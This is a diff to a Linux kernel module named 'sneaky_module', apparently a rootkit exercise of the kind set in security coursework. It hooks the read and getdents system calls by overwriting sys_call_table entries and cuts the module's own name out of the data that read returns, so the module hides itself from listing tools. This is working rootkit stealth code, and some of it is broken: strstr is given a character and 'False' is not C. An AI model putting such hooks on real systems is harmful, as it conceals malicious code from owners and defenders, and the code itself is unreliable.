@@ -117,8 +117,20 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   ssize_t byte_read;
   byte_read = original_read(fd, buf, count);
   if (hide_module_flag) {
+    char *module_name = "sneaky_module";
+    char *module_ptr = strstr(buf, module_name);
+    if (module_ptr) {
+      char *curr = strstr(buf, '\n');
+      size_t sz_diff = (size_t)(curr - (char *)buf);
+      size_t count = byte_read - sz_diff;
+      size_t sneaky_module_sz = (size_t)(curr - module_ptr);
+      memcpy(module_ptr, curr + 1, count);
+      byte_read = byte_read - sneaky_module_sz;
+    }
+    hide_module_flag = False;
   }
-  char *
+  return byte_read;
+
   // if()
 }
 
@@ -142,6 +154,12 @@ static int initialize_sneaky_module(void) {
   // table with the function address of our new code.
   original_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+  original_getdent = (void *)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
